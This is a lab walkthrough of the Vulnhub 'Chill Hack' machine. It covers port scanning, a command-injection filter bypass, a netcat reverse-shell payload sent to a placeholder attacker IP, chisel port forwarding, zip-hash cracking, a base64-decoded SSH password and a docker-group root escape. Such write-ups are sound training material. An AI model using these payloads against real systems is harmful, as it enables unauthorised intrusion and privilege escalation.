* * *
### Title: Chill Hack
### Platform: Vulnhub

* * *

### Wakthrough:

### RECONNAISSANCE

- Spot the ip of the victim machine with `netdiscover -r <eth0 ip>`, to get our host machine's ip, use `ip a | grep "eth0"`

  ![image](https://github.com/user-attachments/assets/be2e49a2-5292-4bc1-b965-e365e86cd7b8)

- Our target ip 

  ![image](https://github.com/user-attachments/assets/b9e27c47-b1aa-442d-8410-e62af682e78a)

- Rustscan's result for open ports,use `rustscan -a [victim's ip] -- -sC -sV`,flag `-sV` is used for port service detection
      
        ❯ rustscan -a 192.168.184.128 -- -sC -sV
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      Real hackers hack time ⌛
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 192.168.184.128:21
      Open 192.168.184.128:80
      Open 192.168.184.128:22
      [~] Starting Script(s)
      [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
      
      [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-26 06:32 EDT
      NSE: Loaded 156 scripts for scanning.
      NSE: Script Pre-scanning.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 06:32
      Completed NSE at 06:32, 0.02s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 06:32
      Completed NSE at 06:32, 0.00s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 06:32
      Completed NSE at 06:32, 0.01s elapsed
      Initiating Ping Scan at 06:32
      Scanning 192.168.184.128 [2 ports]
      Completed Ping Scan at 06:32, 0.01s elapsed (1 total hosts)
      Initiating Parallel DNS resolution of 1 host. at 06:32
      Completed Parallel DNS resolution of 1 host. at 06:32, 0.39s elapsed
      DNS resolution of 1 IPs took 0.39s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
      Initiating Connect Scan at 06:32
      Scanning 192.168.184.128 [3 ports]
      Discovered open port 22/tcp on 192.168.184.128
      Discovered open port 80/tcp on 192.168.184.128
      Discovered open port 21/tcp on 192.168.184.128
      Completed Connect Scan at 06:32, 0.00s elapsed (3 total ports)
      Initiating Service scan at 06:32
      Scanning 3 services on 192.168.184.128
      Completed Service scan at 06:32, 6.26s elapsed (3 services on 1 host)
      NSE: Script scanning 192.168.184.128.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 06:32
      NSE: [ftp-bounce 192.168.184.128:21] PORT response: 500 Illegal PORT command.
      Completed NSE at 06:32, 6.06s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 06:32
      Completed NSE at 06:32, 0.18s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 06:32
      Completed NSE at 06:32, 0.01s elapsed
      Nmap scan report for 192.168.184.128
      Host is up, received syn-ack (0.0055s latency).
      Scanned at 2024-07-26 06:32:25 EDT for 13s
      
      PORT   STATE SERVICE REASON  VERSION
      21/tcp open  ftp     syn-ack vsftpd 3.0.3
      | ftp-anon: Anonymous FTP login allowed (FTP code 230)
      |_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
      | ftp-syst: 
      |   STAT: 
      | FTP server status:
      |      Connected to ::ffff:192.168.184.129
      |      Logged in as ftp
      |      TYPE: ASCII
      |      No session bandwidth limit
      |      Session timeout in seconds is 300
      |      Control connection is plain text
      |      Data connections will be plain text
      |      At session startup, client count was 2
      |      vsFTPd 3.0.3 - secure, fast, stable
      |_End of status
      22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcxgJ3GDCJNTr2pG/lKpGexQ+zhCKUcUL0hjhsy6TLZsUE89P0ZmOoQrLQojvJD0RpfkUkDfd7ut4//Q0Gqzhbiak3AIOqEHVBIVcoINja1TIVq2v3mB6K2f+sZZXgYcpSQriwN+mKgIfrKYyoG7iLWZs92jsUEZVj7sHteOq9UNnyRN4+4FvDhI/8QoOQ19IMszrbpxQV3GQK44xyb9Fhf/Enzz6cSC4D9DHx+/Y1Ky+AFf0A9EIHk+FhU0nuxBdA3ceSTyu8ohV/ltE2SalQXROO70LMoCd5CQDx4o1JGYzny2SHWdKsOUUAkxkEIeEVXqa2pehJwqs0IEuC04sv
      |   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFetPKgbta+pfgqdGTnzyD76mw/9vbSq3DqgpxPVGYlTKc5MI9PmPtkZ8SmvNvtoOp0uzqsfe71S47TXIIiQNxQ=
      |   256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKHq62Lw0h1xzNV41zO3BsfpOiBI3uy0XHtt6TOMHBhZ
      80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
      |_http-server-header: Apache/2.4.29 (Ubuntu)
      |_http-title: Game Info
      | http-methods: 
      |_  Supported Methods: GET POST OPTIONS HEAD
      |_http-favicon: Unknown favicon MD5: 7EEEA719D1DF55D478C68D9886707F17
      Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

- Ffuf's result for directory fuzzing after using wordlist `big.txt`

  ![image](https://github.com/user-attachments/assets/235c0f84-b0e0-47c6-93d0-a5b8b43de550)

- The webserver contains a page `secret`,I tested the site for shell command injection, i noticed it filters linux shell commands.I tested with `ls`
  and got this alert page

 
 ![image](https://github.com/user-attachments/assets/b9835310-bc20-419c-bca1-d90d3520a537)

- I bypassed the filters by enclosing the linux statement with `$()` e.g `$(ls)`.Although the vulnerability is blind because we cannot have access to results of our command. To test it, I set up a listner with nc and got a payload from
`revshells.com` to activate a reverse shell. Now we have shell access to `www-data`

  Payload: `$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc [Attacker'sip] [nc listener's port] >/tmp/f)`

  ![image](https://github.com/user-attachments/assets/188f3c98-6c02-43dd-9a00-22fdc49bb057)

### FOOTHOLD

- Stabilize the shell with the instructions below

           python3 -c "import pty;pty.spawn('/bin/bash')"
           ctrl + z {to make it a backround process}
           stty raw -echo;fg
           export TERM=XTERM
  
  ![image](https://github.com/user-attachments/assets/9f757f47-2f93-46bf-a798-252397d3ec67)

- After runnng `netstat -antp` to check services running on the victim machine. I noticed a page was running on localhost:9001 which is
a customer page.

  ![image](https://github.com/user-attachments/assets/55c1d7c2-ca3c-44cb-b2fc-dead8e43a4b4)

- We can make it available on our machine by port forwarding it with chisel, but our first task  is to send the chisel binary from
our attacker machine.Set up a python http server with this command `python -m http.server 8000` in the director chisel is located.

 ![image](https://github.com/user-attachments/assets/cbd6da90-440f-49eb-9869-aec6ec00d198)

- Receive with `wget http://[host'sip]:[http server'sport]/[binary's name]`, it should be noted that we can only write files to directories like `/dev/shm` and `/tmp` in the victim's machine. I'll be writing to /tmp.The next step is to grant the binary with
`chmod +x {binary}` to grant execute permissions.

  ![image](https://github.com/user-attachments/assets/0871e405-846a-43e1-8373-d5837863995a)--

### PORT FORWARDING

-  Set up a server with `chisel server -p [port] --reverse` on your target machine

  ![image](https://github.com/user-attachments/assets/1d197c0f-d4de-40b5-9ffe-368cb5663647)

- We have to set up a client on the victim's machine with `./chisel client [attacker'sip]:[chisel's server port] R:[port that you want to tunnel through]:[localhost]:[port running the service internally]`.After executing, the client should communicate with our server.

   `./chisel client 192.168.184.129:8002 R:8003:127.0.0.1:9001`
   
  ![image](https://github.com/user-attachments/assets/3eb0eb80-1e18-48f0-83dd-1a18405191cd)

- Fuzzing for web directories and files with ffuf reveals an images directories.

  ![image](https://github.com/user-attachments/assets/a41b2238-849d-493e-98d1-566209ad6072)

- The `images/` directories contains a gif and jpg images.I decided to perform steganography on the jpg file to check if the file is within the jpg file.

  ![image](https://github.com/user-attachments/assets/a4603504-669c-4586-9d49-5a56f7dc6b2d)

- Download the file to your machine with wget and use `stegseek` to crack the jpg file passphrase

  ![image](https://github.com/user-attachments/assets/75d02ae7-b8a4-43f0-962f-913fad045fd6)

- The jpg file was not password protected and it contains a backup.zip file but the zip file is password protected

  ![image](https://github.com/user-attachments/assets/09c011b2-4f42-41ea-b5b7-526b765631d0)

- I cracked the zip wit `John the ripper` but the fist process is to recover the hash with `zip2john [zipfile] > hashfile`.Then, crack with `john --wordlist=[probably rockyou] hash`. Since I have cracked the password before, I used option `--show` to show the password.

  ![image](https://github.com/user-attachments/assets/9d9f461a-fe4b-492f-926a-27c667afcb9b)

- Use `unzip [file]` to unzip the zip archive. The file contains a php file code which reveals a b64 encoded password.

   ![image](https://github.com/user-attachments/assets/87babf44-ed57-46fa-9d87-308e4ee32bd4)
    

- The value of the base64 encoded string is ``.To decode the string,use `echo "base64string" | base64 -d`.

        ❯ echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d
         !d0ntKn0wmYp@ssw0rd
      
- I was unable to get the authentication page, I decided to test the password `!d0ntKn0wmYp@ssw0rd` on the ssh user `anurodh` and I got ssh access to the user anurodh

  ![image](https://github.com/user-attachments/assets/e7df196b-da48-4c1f-93a5-81bcd1121331)
  

### Privilege Escalation with Docker

-  User `anurodh` is under the group `docker`, we can run a privileged docker container and breakout as root.

  ![image](https://github.com/user-attachments/assets/af0baaf1-532b-44db-ae17-4c567aa4351e)

- I got a payload from <a href="https://gtfobins.github.io/gtfobins/docker/">gtfobins</a> to escalate privileges

  Payload: `docker run -v /:/mnt --rm -it alpine chroot /mnt bash`

  ![image](https://github.com/user-attachments/assets/f1e7c738-0aa8-43ed-8f4a-d7dedf1f8ceb)

- Flags:

  ![image](https://github.com/user-attachments/assets/85ebad7b-5eda-46e2-a411-b0f831003a31)



  




 
